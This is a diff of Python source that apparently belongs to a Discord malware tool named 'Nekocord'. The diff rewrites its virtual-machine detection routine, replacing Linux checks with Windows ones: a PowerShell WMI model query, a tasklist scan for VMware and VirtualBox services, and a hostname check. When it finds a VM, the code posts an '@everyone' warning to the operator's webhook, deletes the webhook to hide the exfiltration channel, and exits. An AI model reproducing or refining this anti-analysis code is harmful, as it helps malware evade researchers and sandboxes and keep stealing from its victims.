@@ -161,79 +161,62 @@ def screenshot():
     else:
         pass
 
-## Anti Environment (virtual environment)
+
+def is_virtual_machine_windows():
+    try:
+        command = [
+            "powershell",
+            "-Command",
+            "Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Model"
+        ]
+        output = subprocess.check_output(command, stderr=subprocess.DEVNULL).decode().strip().lower()
+
+        vm_keywords = ["virtual", "vmware", "virtualbox", "kvm", "xen", "qemu", "hyper-v", "parallels"]
+        for keyword in vm_keywords:
+            if keyword in output:
+                pass
+                return True
+    except Exception as e:
+        pass
+    return False
+
 def checker():
     is_vm = False
 
-    ## apponfly | apponfly.com
+
     hostname = socket.gethostname()
-    apponfly = "AppOnFly-VPS"
-    if hostname.lower() == apponfly.lower():
-        print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
+    if hostname.lower() == "apponfly-vps":
+        pass
         is_vm = True
 
-    ## VMware | ???
-    dmesg = os.popen("dmesg | grep -i vmware").read()
-    if "VMware" in dmesg:
-        print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
+
+    if is_virtual_machine_windows():
         is_vm = True
 
+    suspicious_processes = ["vmtoolsd.exe", "vboxservice.exe"]
     try:
-        with open("/sys/class/dmi/id/product_name", "r") as file:
-            product_name = file.read().strip()
-            if "VirtualBox" in product_name:
-                print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
+        tasks = os.popen("tasklist").read().lower()
+        for proc in suspicious_processes:
+            if proc in tasks:
+                pass
                 is_vm = True
-    except FileNotFoundError:
+    except Exception as e:
         pass
 
-    if os.path.exists("/sys/class/dmi/id/product_name"):
-        try:
-            with open("/sys/class/dmi/id/product_name", "r") as file:
-                product_name = file.read().strip()
-                if "Hyper-V" in product_name:
-                    print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
-                    is_vm = True
-        except FileNotFoundError:
-            pass
-
-    cpu_info = os.popen("cat /proc/cpuinfo").read()
-    if "parallels" in cpu_info.lower():
-        print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
-        is_vm = True
-
-    if os.path.exists("/dev/virtio"):
-        print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
-        is_vm = True
-
-    if os.path.exists("/sys/class/dmi/id/product_name"):
-        try:
-            with open("/sys/class/dmi/id/product_name", "r") as file:
-                product_name = file.read().strip()
-                if "KVM" in product_name:
-                    print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
-                    is_vm = True
-        except FileNotFoundError:
-            pass
-
-    if os.path.exists("/proc/scsi/scsi"):
-        scsi_info = os.popen("cat /proc/scsi/scsi").read()
-        if "VMware" in scsi_info or "VirtualBox" in scsi_info:
-            print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
-            is_vm = True
-
     if is_vm:
-        sys.exit(1)
-
         data_VM = {
-            "username": "Nekocord | VM Detection", 
-            "content": f"# {types} \n ⚠️WARN⚠️ \n We've detected activity attempting to attack or debug your webhook. This webhook has been removed",
-            "avatar_url": "https://i.imgur.com/VF1uUWN.png",  
+            "username": "Nekocord | VM Detection",
+            "content": f"# @everyone \n ⚠️WARN⚠️ \n We've detected activity attempting to attack or debug your webhook. This webhook has been removed.",
+            "avatar_url": "https://i.imgur.com/VF1uUWN.png",
         }
 
-        response = requests.post(h00k, json=data_VM)
-        time.sleep(2)
-        deleter = requests.delete(h00k)
+        try:
+            requests.post(h00k, json=data_VM)
+            time.sleep(2)
+            requests.delete(h00k)
+        except Exception as e:
+            pass
+        sys.exit(1)
 
 def main():
     checker()
